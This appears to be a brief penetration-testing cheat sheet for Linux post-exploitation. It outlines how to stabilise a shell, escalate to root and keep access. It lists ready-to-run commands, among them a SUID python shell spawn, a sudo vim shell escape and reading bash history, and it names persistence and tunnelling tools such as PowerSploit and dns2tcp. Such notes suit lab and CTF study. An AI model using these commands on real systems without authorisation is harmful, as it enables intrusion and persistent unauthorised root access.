
INPUT: Shell
PROCESS:
- Stablish Shell
- Privilege Escalation
- Maintain Access
OUPUT: 
- root Shell


## Stablish Shell
[python]
```sh
python3 -c 'import pty;pty.spawn("/bin/bash");'
export TERM=xterm
```

## Privilege Escalation
[SUID] find / -perm /4000 2>/dev/null
    - [python] <python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'>
[sudo] <id; sudo -l; sudo -V>
- [vim] <sudo vim -c ':!/bin/sh'>
[WebServer]:
- [python3]: python3 module <python3 -m http.server>
[Bash]  
- [History] <cat .bash_history>
[vsftpd]


## Maintain Access
- PowerSploit
- Weewly
- dns2tcp